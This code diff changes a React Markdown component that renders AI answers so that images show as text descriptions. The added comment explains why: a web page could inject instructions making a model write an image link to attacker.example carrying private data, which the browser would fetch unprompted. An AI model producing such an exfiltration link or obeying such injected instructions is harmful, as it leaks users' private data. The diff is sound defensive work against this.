@@ -9,6 +9,10 @@ import { cn } from "@/lib/utils";
 /**
  * A seat's answer as Markdown. Code is highlighted once the answer is finished: re-highlighting on every streamed
  * chunk would be wasted work.
+ *
+ * ⚠️ Images never load (ADR 0014). A web page can tell a model to write ![](https://attacker.example/?data=private),
+ * and the browser would send that with no click at all, getting around the rule on which URLs seats may read. So an
+ * image shows as its description.
  */
 export const Markdown = memo(function Markdown({
   text,
@@ -24,6 +28,9 @@ export const Markdown = memo(function Markdown({
         rehypePlugins={streaming ? [] : [[rehypeHighlight, { detect: false }]]}
         components={{
           a: ({ node: _node, ...props }) => <a {...props} target="_blank" rel="noreferrer" />,
+          img: ({ alt }) => (
+            <span className="text-muted-foreground">[image: {alt || "no description"}]</span>
+          ),
         }}
       >
         {text}
